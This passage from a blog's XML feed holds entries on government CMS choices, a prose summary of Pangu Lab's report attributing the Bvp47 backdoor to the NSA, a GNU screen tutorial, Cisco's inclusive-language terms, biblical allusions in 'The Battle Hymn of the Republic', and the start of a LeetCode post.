href="http://www.michigan.gov/">Michigan</a> (Vignette)</p><p><a href="http://mdc.mo.gov/">Missouri Department of Conservation</a>(Drupal)</p><p><a href="http://nv.gov/">Nevada</a> (Ektron CMS 400 8.6)</p><p><a href="http://www.dec.ny.gov/">New York Department of EnvironmentalConservation</a> (RedDot)</p><p>Texas</p><ul><li><a href="http://www.tpwd.state.tx.us/">Parks &amp; WildlifeDepartment</a> (Plone)</li><li><a href="http://www.tceq.state.tx.us/">Commission on EnvironmentalQuality</a> (Plone)</li></ul><p>Washington</p><ul><li><a href="http://www.drs.wa.gov/">Department of RetirementSystems</a> (Interwoven TeamSite)</li><li><a href="http://dor.wa.gov/Content/Home/Default.aspx">Department ofRevenue</a> (Drupal)</li><li><a href="http://www.ecy.wa.gov/">Department of Ecology</a>(Kentico)</li><li><a href="http://www.esd.wa.gov/">Employment Security Department</a>(Interwoven TeamSite)</li></ul><h2 id="local-government">Local Government</h2><p><strong>Agency or website (Tool, product or service)</strong></p><p><a href="http://www.arlingtonva.us/">Arlington County, Virginia</a>(WordPress)</p><p><a href="https://www.sf.gov/">City and County of San Francisco</a>(Drupal)</p><p><a href="http://fortworthtexas.gov/">City of Fort Worth, Texas</a>(Ektron)</p><p><a href="http://www.killeentexas.gov/index.php?section=1">City ofKilleen, Texas</a> (ExponentCMS.org)</p><p><a href="http://www.nngov.com/">City of Newport News</a> (Plone)</p><p><a href="http://www.wheaton.il.us/">City of Wheaton, Illinois</a>(Commercial Product/Dreamweaver)</p><p><a href="http://www.sccgov.org/sites/scc/Pages/default.aspx">Countyof Santa Clara Public Portal</a> (Vignette)</p><p><a href="http://www.douglas.co.us/">Douglas County, Colorado</a>(Stellent)</p><p><a href="https://morriscountynj.gov/">Morris County, New Jersey</a>(WordPress)</p><p>From:https://digital.gov/resources/content-management-systems-used-by-government-agencies/</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bvp47 - NSA</title>
      <link href="/2023/04/14/bvp47-nsa/"/>
      <url>/2023/04/14/bvp47-nsa/</url>
      
        <content type="html"><![CDATA[<h1 id="bvp47---nsa">Bvp47 - NSA</h1><p>2013年，盘古实验室研究员在针对某国内要害部门主机的调查过程中，提取了一个经过复杂加密的Linux平台后门，其使用的基于SYN包的高级隐蔽信道行为和自身的代码混淆、系统隐藏、自毁设计前所未见。在不能完全解密的情况下，进一步发现这个后门程序需要与主机绑定的校验码才能正常运行，随后研究人员又破解了校验码，并成功运行了这个后门程序，从部分行为功能上断定这是一个顶级APT后门程序，但是进一步调查需要攻击者的非对称加密私钥才能激活远控功能，至此研究人员的调查受阻。基于样本中最常见的字符串“Bvp”和加密算法中使用数值0x47，命名为“Bvp47”。</p><p>2016年，知名黑客组织“影子经纪人”（The ShadowBrokers）宣称成功黑进了“方程式组织”，并于2016年和2017年先后公布了大量“方程式组织”的黑客工具和数据。盘古实验室成员从“影子经纪人”公布的文件中，发现了一组疑似包含私钥的文件，恰好正是唯一可以激活Bvp47顶级后门的非对称加密私钥，可直接远程激活并控制Bvp47顶级后门。可以断定，Bvp47是属于“方程式组织”的黑客工具。</p><p>研究人员通过进一步研究发现，“影子经纪人”公开的多个程序和攻击操作手册，与2013年前美国中情局分析师斯诺登在“棱镜门”事件中曝光的NSA网络攻击平台操作手册中所使用的唯一标识符完全吻合。</p><p>鉴于美国政府以“未经允许传播国家防务信息和有意传播机密情报”等三项罪名起诉斯诺登，可以认定“影子经纪人”公布的文件确属NSA无疑，这可以充分证明，方程式组织隶属于NSA，即Bvp47是NSA的顶级后门。</p><p>“影子经济人”的文档揭示受害范围超过45个国家287个目标，包括俄罗斯、日本、西班牙、德国、意大利等，持续十几年时间，某日本受害者被利用作为跳板对目标发起攻击。</p><p>盘古实验室为多起Bvp47同源样本事件起了一个代号“电幕行动”。电幕（Telescreen）是英国作家乔治·奥威尔在小说《1984》中想象的一个设备，可以用来远程监控部署了电幕的人或组织，“思想警察”可以任意监视任意电幕的信息和行为。</p><p>方程式组织是世界超一流的网络攻击组织，普遍认为隶属于美国国家安全局NSA。从所获取的包括Bvp47在内的相关攻击工具平台来看，方程式组织确实堪称技术一流，工具平台设计良好、功能强大、广泛适配，底层以0day漏洞体现的网络攻击能力在当时的互联网上可以说畅通无阻，获取被隐秘控制下的数据如探囊取物，在国家级的网空对抗中处于主导地位。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://www.pangulab.cn/images/bvp47.zh-cn.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>在报告“Bvp47-美国NSA方程式组织的顶级后门”（参考1）的描述中，Bvp47本身像是一个巨大的壳或压缩包，共包含了18个分片，盘古实验室展示了对于Bvp47后门程序的归属分析和部分技术细节的描述，比如BPF隐蔽隧道，但依然还有部分其他模块值得深入探究，这些模块既可以作为Bvp47的一部分一起执行任务，也可以被独立使用。</p><p>在2015年对国内某国家重要关键信息基础设施的Solaris系统取证中，盘古实验室提取到了一份独立存活于Solaris平台看起来与Bvp47关系密切的样本，后经确认，样本文件内容与“影子经纪人”（TheShadowBrokers）揭露出的“饮茶”（Suctionchar_Agent）木马程序原文件一致。该木马程序搭配Bvp47中的Dewdrop、Incision等模块和控制程序tipoff，可以轻松窃取目标系统用户在执行ssh、passwd、sudo等命令时的账号密码，随即将其隐蔽保存在目标系统中。这些被加密隐藏的密码文件同样也需要RSA算法的私钥来解密。</p><p>基于特征的入侵分析取证发现，国内大量重要组织机构受到了这个美国国家安全局（NSA）来源的“饮茶”（Suctionchar_Agent）木马程序的侵袭，其中就包括了近期披露的被网络渗透的西北工业大学。有证据显示，NSA利用“饮茶”（Suctionchar_Agent）木马程序窃取了世界各国难以确切估量的账号密码，在美国各地建立了多个高度机密的账号密码海量数据存储中心，供NSA的行动部门TAO随时查询并“合法”进入受害者的信息系统。</p><p>追踪Bvp47的过程更像是在摸索一张迷雾下的拼图，在奇安盘古实验室与国家计算机病毒应急处理中心的通力合作下，这份报告将会通过对“饮茶”（Suctionchar_Agent）、Dewdrop、Bvp47_loader等程序和系统模块的技术分析来进一步理解Bvp47这个顶级后门平台的部分工作方式和执行逻辑。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://www.pangulab.cn/images/bvp47_ii.zh-cn.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>​</p><h2 id="refers">Refers</h2><ul><li>https://www.pangulab.cn/files/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group_ii.zh-cn.pdf</li><li>https://www.pangulab.cn/files/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en.pdf</li><li>https://www.google.com.hk/search?q=FOXACID-Server-SOP-Redacted.pdf</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>通过 screen 后台运行程序</title>
      <link href="/2023/04/14/tong-guo-screen-hou-tai-yun-xing-cheng-xu/"/>
      <url>/2023/04/14/tong-guo-screen-hou-tai-yun-xing-cheng-xu/</url>
      
        <content type="html"><![CDATA[<p><strong>一、背景</strong></p><p>系统管理员经常需要SSH 或者telent 远程登录到Linux服务器，经常运行一些需要很长时间才能完成的任务，比如系统备份、ftp传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为它们执行的时间太长了。必须等待它们执行完毕，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。</p><p><strong>二、简介</strong></p><p><strong>GNUScreen</strong>是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。</p><p>GNUScreen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p><ul><li><p><strong>会话恢复</strong></p></li><li><p><strong>多窗口</strong></p></li><li><p><strong>会话共享</strong></p></li></ul><p>GNU's Screen 官方站点：http://www.gnu.org/software/screen/</p><p><strong>三、语法</strong></p><p># screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r&lt;作业名称&gt;][-s ][-S &lt;作业名称&gt;]</p><p><strong>参数说明</strong></p><p>-A 　将所有的视窗都调整为目前终端机的大小。 -d &lt;作业名称&gt;　将指定的screen作业离线。 -h &lt;行数&gt; 　指定视窗的缓冲区行数。 -m　即使目前已在作业中的screen作业，仍强制建立新的screen作业。 -r&lt;作业名称&gt; 　恢复离线的screen作业。 -R　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。 -s　指定建立新视窗时，所要执行的shell。 -S &lt;作业名称&gt;　指定screen作业的名称。 -v 　显示版本信息。 -x　恢复之前离线的screen作业。 -ls或--list 　显示目前所有的screen作业。-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。</p><p><strong>四、常用screen参数</strong></p><p>screen -S yourname -&gt; 新建一个叫yourname的session screen -ls -&gt;列出当前所有的session screen -r yourname -&gt; 回到yourname这个sessionscreen -d yourname -&gt; 远程detach某个session screen -d -r yourname-&gt; 结束当前session并回到yourname这个session</p><p><strong>在每个screen session 下，所有命令都以 ctrl+a(C-a)开始。</strong> C-a ? -&gt; 显示所有键绑定信息 C-a c -&gt;创建一个新的运行shell的窗口并切换到该窗口 C-a n -&gt; Next，切换到下一个window C-a p -&gt; Previous，切换到前一个 window C-a 0..9 -&gt; 切换到第0..9 个 window Ctrl+a [Space] -&gt; 由视窗0循序切换到视窗9 C-a C-a -&gt;在两个最近使用的 window 间切换 C-a x -&gt; 锁住当前的window，需用用户密码解锁 C-a d -&gt;detach，暂时离开当前session，将目前的 screen session (可能含有多个windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screensession 里，每个 window 内运行的 process(无论是前台/后台)都在继续执行，即使 logout 也不影响。 C-a z -&gt;把当前session放到后台执行，用 shell 的 fg 命令则可回去。 C-a w -&gt;显示所有窗口列表 C-a t -&gt; Time，显示当前时间，和系统的 load C-a k-&gt; kill window，强行关闭当前的 window C-a [ -&gt; 进入 copy mode，在copy mode 下可以回滚、搜索、复制就像用使用 vi 一样 C-b Backward，PageUpC-f Forward，PageDown H(大写) High，将光标移至左上角 LLow，将光标移至左下角 0 移到行首 $ 行末 w forward oneword，以字为单位往前移 b backward one word，以字为单位往后移 Space第一次按为标记区起点，第二次按为终点 Esc 结束 copy mode C-a ] -&gt;Paste，把刚刚在 copy mode 选定的内容贴上</p><p><strong>五、使用 screen</strong></p><p><strong>5.1 安装screen</strong></p><p>流行的Linux发行版（例如Red Hat EnterpriseLinux）通常会自带screen实用程序，如果没有的话，可以从GNUscreen的官方网站下载。</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# yum install screen[root@TS-DEV ~]# rpm -qa|grep screenscreen-4.0.3-4.el5[root@TS-DEV ~]#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.2 创建一个新的窗口</strong></p><p>安装完成后，直接敲命令screen就可以启动它。但是这样启动的screen会话没有名字，实践上推荐为每个screen会话取一个名字，方便分辨：</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# screen -S david <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>screen启动后，会创建第一个窗口，也就是窗口No.0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如：</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# screen vi david.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>screen创建一个执行vi david.txt的单窗口会话，退出vi将退出该窗口/会话。</p><p><strong>5.3 查看窗口和窗口名称</strong></p><p>打开多个窗口后，可以使用快捷键C-aw列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用X环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样：</p><pre class="line-numbers language-none"><code class="language-none">0$ bash  1-$ bash  2*$ bash  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个例子中我开启了三个窗口，其中*号表示当前位于窗口2，-号表示上一次切换窗口时位于窗口1。</p><p>Screen默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。可以使用快捷键C-aA来为当前窗口重命名，按下快捷键后，Screen会允许你为当前窗口输入新的名字，回车确认。</p><p><strong>5.4 会话分离与恢复</strong></p><p>你可以不中断screen窗口中程序的运行而暂时断开（detach）screen会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。例如，我们打开一个screen窗口编辑/tmp/david.txt文件：</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# screen vi /tmp/david.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入<code>C-a d</code>，Screen会给出detached提示：</p><p><strong>暂时中断会话</strong></p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://images0.cnblogs.com/blog/370046/201301/29144351-ff7e78c079a44f51ae44d48b6942b87f.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>半个小时之后回来了，找到该screen会话：</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# screen -ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><figure><img src="https://googles.plus/images/loading.gif" data-original="https://images0.cnblogs.com/blog/370046/201301/29144759-7cea9fc3f5f4481ab21df8bd017c88ef.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>重新连接会话：</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# screen -r 12865<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一切都在。</p><p>当然，如果你在另一台机器上没有分离一个Screen会话，就无从恢复会话了。</p><p>这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://images0.cnblogs.com/blog/370046/201301/29215655-6d2f0c7e7f294756a4b40a40e1e76a84.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p><strong>5.5 清除dead 会话</strong></p><p>如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen-list会显示该会话为dead状态。使用screen -wipe命令清除该会话：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://images0.cnblogs.com/blog/370046/201301/29154746-51185199905542c68d3c3b46dddef648.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p><strong>5.6 关闭或杀死窗口</strong></p><p>正常情况下，当你退出一个窗口中最后一个程序（通常是bash）后，这个窗口就关闭了。另一个关闭窗口的方法是使用C-ak，这个快捷键杀死当前的窗口，同时也将杀死这个窗口中正在运行的进程。</p><p>如果一个Screen会话中最后一个窗口被关闭了，那么整个Screen会话也就退出了，screen进程会被终止。</p><p>除了依次退出/杀死当前Screen会话中所有窗口这种方法之外，还可以使用快捷键C-a:，然后输入quit命令退出Screen会话。需要注意的是，这样退出会杀死所有窗口并退出其中运行的所有程序。其实C-a:这个快捷键允许用户直接输入的命令有很多，包括分屏可以输入split等，这也是实现Screen功能的一个途径，不过个人认为还是快捷键比较方便些。</p><p><strong>六、screen 高级应用</strong></p><p><strong>6.1 会话共享</strong></p><p>还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个screen会话，你朋友可以在他的终端上命令：</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# screen -x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将你朋友的终端Attach到你的Screen会话上，并且你的终端不会被Detach。这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。</p><p><strong>6.2 会话锁定与解锁</strong></p><p>Screen允许使用快捷键C-as锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。快捷键C-aq可以解锁一个会话。</p><p>也可以使用C-ax锁定会话，不同的是这样锁定之后，会话会被Screen所属用户的密码保护，需要输入密码才能继续访问这个会话。</p><p><strong>6.3 发送命令到screen会话</strong></p><p>在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作：</p><pre class="line-numbers language-none"><code class="language-none">[root@TS-DEV ~]# screen -S sandy -X screen ping www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令在一个叫做sandy的screen会话中创建一个新窗口，并在其中运行ping命令。</p><p><strong>6.4 屏幕分割</strong></p><p>现在显示器那么大，将一个屏幕分割成不同区域显示不同的Screen窗口显然是个很酷的事情。可以使用快捷键C-aS将显示器水平分割，Screen 4.00.03版本以后，也支持垂直分屏，快捷键是C-a|。分屏以后，可以使用C-a<tab>在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。</tab></p><p>可以用C-a X快捷键关闭当前焦点所在的屏幕区块，也可以用C-aQ关闭除当前区块之外其他的所有区块。关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://images0.cnblogs.com/blog/370046/201301/29205553-38cdde403beb45f4814ca9a180987a9e.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p><strong>6.5 C/P模式和操作</strong></p><p>screen的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。使用快捷键C-a<esc>或者C-a[可以进入copy/paste模式，这个模式下可以像在vi中一样移动光标，并可以使用空格键设置标记。其实在这个模式下有很多类似vi的操作，譬如使用/进行搜索，使用y快速标记一行，使用w快速标记一个单词等。关于C/P模式下的高级操作，其文档的这一部分有比较详细的说明。</esc></p><p>一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在copy/pastebuffer中，并退出copy/paste模式。在正常模式下，可以使用快捷键C-a]将储存在buffer中的内容粘贴到当前窗口。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://images0.cnblogs.com/blog/370046/201301/29210355-9026652834d446d2bbafa18fd7bca276.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p><strong>6.6 更多screen功能</strong></p><p>同大多数UNIX程序一样，GNUScreen提供了丰富强大的定制功能。你可以在Screen的默认两级配置文件/etc/screenrc和$HOME/.screenrc中指定更多，例如设定screen选项，定制绑定键，设定screen会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定screen配置文件。</p><p>以多用户功能为例，screen默认是以单用户模式运行的，你需要在配置文件中指定multiuseron来打开多用户模式，通过acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的screen会话。更多配置文件内容请参考screen的man页。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络技术与计算机中的包容性语言</title>
      <link href="/2023/04/14/wang-luo-ji-zhu-yu-ji-suan-ji-zhong-de-bao-rong-xing-yu-yan/"/>
      <url>/2023/04/14/wang-luo-ji-zhu-yu-ji-suan-ji-zhong-de-bao-rong-xing-yu-yan/</url>
      
        <content type="html"><![CDATA[<h3 id="an-inclusive-future-requires-inclusive-language"># An InclusiveFuture Requires Inclusive Language</h3><p>Cisco’s purpose is to power an inclusive future for all. With ourpurpose at the heart of everything we do, you can count on Cisco to bebold, brave and deliberate about our role and the actions we will takein support of social justice.</p><p>We are proud to join the technology community in evolving thelanguage we use. Rethinking the words we use is just one of the ways toreduce barriers to equity and respect.</p><p>As a matter of policy, Cisco content should be free of offensive orsuggestive language, graphics, and scenarios. We are changing terms, asnoted below, to more appropriate alternatives.</p><table><colgroup><col style="width: 24%"><col style="width: 75%"></colgroup><thead><tr class="header"><th>Term</th><th>Recommended Replacements</th></tr></thead><tbody><tr class="odd"><td>master/slave</td><td>primary/secondary or primary/subordinate or control/data (forclustering)</td></tr><tr class="even"><td>whitelist/blacklist</td><td>permit (list)/block (list) or allow (list)/block (list)</td></tr></tbody></table><ul><li>https://www.cisco.com/c/en/us/about/social-justice/inclusive-language-policy.html</li><li>https://www.cisco.com/c/en/us/about/social-justice.html</li><li>https://blog.talosintelligence.com/talos-replacing-blacklist-blocklist-allowlist/</li><li>https://www.redhat.com/en/blog/making-open-source-more-inclusive-eradicating-problematic-language</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Battle Hymn of the Republic - 共和国战歌中的典故</title>
      <link href="/2023/04/06/the-battle-hymn-of-the-republic-gong-he-guo-zhan-ge-zhong-de-dian-gu/"/>
      <url>/2023/04/06/the-battle-hymn-of-the-republic-gong-he-guo-zhan-ge-zhong-de-dian-gu/</url>
      
        <content type="html"><![CDATA[<h1 id="the-battle-hymn-of-the-republic---共和国战歌中的典故">The BattleHymn of the Republic - 共和国战歌中的典故</h1><p>I've listened "Battle Hymn of the Republic". On the second line itwrites: <em>"He is trampling out the vintage where the grapes of wrathare stored"</em>.</p><p>I know the allusion to The Grapes of Wrath here, but The Battle Hymnof the Republic born much earlier than it.</p><p>I wonder which one is Lord trampling? vintage or grapes? And what itrepresents?</p><hr><p>After days of searching, I found the answer:</p><p>Book of Revelation, 14</p><pre class="line-numbers language-none"><code class="language-none">. . .A third angel followed them and said in a loud voice: “If anyone worships the beast and its image and receives its mark on their forehead or on their hand, they, too, will drink the wine of God’s fury, which has been poured full strength into the cup of his wrath. . . .So the angel swung his sickle to the earth and gathered the clusters from the vine of the earth, and threw them into the great wine press of the wrath of God. They were trampled in the winepress outside the city, and blood flowed out of the press, rising as high as the horses’ bridles for a distance of 1,600 stadia.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Specifically, it talks about angels descending to earth to removeevil from the world, and that evil being turned entirely into the wrathof God. The Battle Hymn of the Republic makes a reference to this in itsopening lyrics, essentially saying that the wrath of God will wipe evil(slavery, the Confederacy) off of the earth. It's a apparently amodified version of John Brown's Body (a poem about John Brown, anevangelical abolitionist who pursued violence to end slavery), which isitself a modified version of "Oh brothers, will you meet us on Canaan'shappy shore?", so it's all very tied into Christian roots. "Tramplingout the vintage" refers to trampling (destroying) the grapes (evil) toproduce wine (wrath). I think it's supposed to be a play on words,"trampling out" meaning "rolling out" an old-school type of wrath.</p><hr><p>共和国战歌仿佛老兵在营火边对后辈的劝谏，又仿佛殉道者布道时传颂的福音。</p><p>总的来说，《共和国战歌》的前两句的歌词是这样的：</p><p><em>我双眼已经看见我主降临的荣光，</em></p><p><em>祂正践踏那滋长忿怒之果的地方；</em></p><p>一开时以为是指代 John Ernst Steinbeck 所作的 <em>The Grapes ofWrath</em>. 但是共和国战歌作曲时间为 1862 左右，比前者早很多。</p><p>后来发现，这个典故是出自《圣经》- 启示录 中的第 14 章：</p><pre class="line-numbers language-none"><code class="language-none">……又有第三位天使，接着他们，大声说，若有人拜兽和兽像，在额上或在手上，受了印记，这人也必喝神大怒的酒，此酒斟在神忿怒的杯中纯一不杂。……那天使就把镰刀扔在地上，收取了地上的葡萄，丢在神忿怒的大酒榨中。那酒榨踹在城外，就有血从酒榨里流出来，高到马的嚼环，远有六百里。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体来说，它讲了个了天使下凡清除邪恶的故事，而邪恶完全变成了上帝的愤怒。《共和国战歌》在开头的歌词中提到了这一点，基本上是说上帝的愤怒将把邪恶（奴隶制、南方联盟）从地球上消灭。这显然是《约翰-布朗的身体》（一首关于约翰-布朗的诗，他是一位追求暴力以结束奴隶制的福音派废奴主义者）的修改版，而那首歌又是《迦南之乐土》/《兄弟们，你们会遇见我吗？》的修改版，所以这一切都与基督教的根源有很大关系。“践踏葡萄”指的是践踏（毁坏）葡萄（邪恶）以生产葡萄酒（愤怒）。我认为这应该是一个文字游戏，“践踏出”意味着“带出”一种非常“老学校”（怀旧、老派）式的愤怒。</p><hr><pre class="line-numbers language-none"><code class="language-none">Mine eyes have seen the glory of the coming of the Lord.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>"coming of the lord" 指的是主（Jesus）第二次降临，即——审判世界。</p><p>耶稣再临（有时称为第二次降临或基督再临，英文 <em>Second Advent</em>或 <em>Parousia</em>）是一个基督教概念。二千年前，耶稣“第一次来到”，然后耶稣升天。耶稣再临是指他在未来将回到人间。这个信仰是基于正典福音书中的弥赛亚预言，它是大多基督教末世论的一部分。不同的教派和基督徒对耶稣再临的性质有不同的看法。</p><hr><pre class="line-numbers language-none"><code class="language-none">Glory, glory, hallelujah!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据亚伯拉罕宗教，荣耀（来自拉丁语<em>gloria</em>，意为“名声、名望”）被用来描述人类所感知的上帝存在的表现。</p><p>在<strong>出埃及记 33:18-20</strong>中，摩西被告知没有人能看到耶和华的荣耀（希伯来语：כָּבוֹדkavod）而幸存。</p><p>“哈利路亚”（Hallelujah）是“赞美耶和华”的意思（耶和华是圣经上永生上帝的名字），是基督徒当赞美上帝（神）时所用的欢呼语。</p><table><colgroup><col style="width: 51%"><col style="width: 48%"></colgroup><thead><tr class="header"><th>英文</th><th>中文</th></tr></thead><tbody><tr class="odd"><td>Revelation 19:6</td><td>启示录 19:6</td></tr><tr class="even"><td>Alleluia: for the Lord God omnipotent reigneth.</td><td>哈利路亚．因为主我们的　神、全能者、作王了。</td></tr><tr class="odd"><td>Revelation 11:15</td><td>启示录 11:15</td></tr><tr class="even"><td>The Kingdoms of this world are become the kingdoms of our Lord andof His Christ; and He shall reign for ever and ever.</td><td>世上的国、成了我主和主基督的国．他要作王、直到永永远远。</td></tr><tr class="odd"><td>Revelation 19:16</td><td>启示录 19:16</td></tr><tr class="even"><td>KING OF KINGS AND LORD OF LORDS.</td><td>万王之王、万主之主。</td></tr></tbody></table><hr><pre class="line-numbers language-none"><code class="language-none">Let the Hero, born of woman, crush the serpent with his heel.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>女人的后裔（希伯来语：זְַעָ֑הּ，罗马化：zar'āh，直译为“她的后裔”）是创世记中的一个短语：由于蛇对夏娃的诱惑，导致了人类堕落之后，上帝宣布（在<strong>创世记3:15</strong>中）他将在蛇的后裔和女人的后裔之间建立仇恨。在基督教中，这节经文被称为protoevangelium，并被解释为耶稣降临的预言。在犹太教中，“女人的后裔”被视为对<strong>整个人类</strong>的集体参考。</p><p>女人的后裔，圣经中指代耶稣。Serpent 是骗夏娃吃果子的蛇。</p><p>女人的后裔要伤你的头；你要伤他的脚跟。<strong>创世记3:15</strong></p><hr><pre class="line-numbers language-none"><code class="language-none">I have seen Him in the watch-fires of a hundred circling camps,They have builded Him an altar in the evening dews and damps;I can read His righteous sentence by the dim and flaring lamps:His day is marching on.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以解读为清教徒乘着五月花号的登陆，也可以解释为美利坚合众国南北战争（CivilWar）时期北军军营。</p><hr><pre class="line-numbers language-none"><code class="language-none">In the beauty of the lilies Christ was born across the sea.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>百合预指圣洁，美丽，丰富；"across the sea"——美国与以色列伯利恒隔海相望。</p><hr><pre class="line-numbers language-none"><code class="language-none">With a glory in His bosom that transfigures you and me.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>人不能自救除非上帝救人。</p><hr><pre class="line-numbers language-none"><code class="language-none">As He died to make men holy, let us die to make men free.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前者指耶稣被逮捕后以十字架处死，后者指南北战争，北军解放奴隶。</p><hr><pre class="line-numbers language-none"><code class="language-none">He is coming like the glory of the morning on the wave,He is Wisdom to the mighty, He is Succour to the brave,So the world shall be His footstool, and the soul of Time His slave,Our God is marching on.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>基督教里的耶稣是老师，服侍别人的，也是万王之王，万主之主。</p>]]></content>
      
      
      
        <tags>
            
            <tag> U.S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode.1637 两点之间不包含任何点的最宽垂直区域</title>
      <link href="/2023/03/30/leetcode-1637-liang-dian-zhi-jian-bu-bao-han-ren-he-dian-de-zui-kuan-chui-zhi-qu-yu/"/>
      <url>/2023/03/30/leetcode-1637-liang-dian-zhi-jian-bu-bao-han-ren-he-dian-de-zui-kuan-chui-zhi-qu-yu/</url>
      
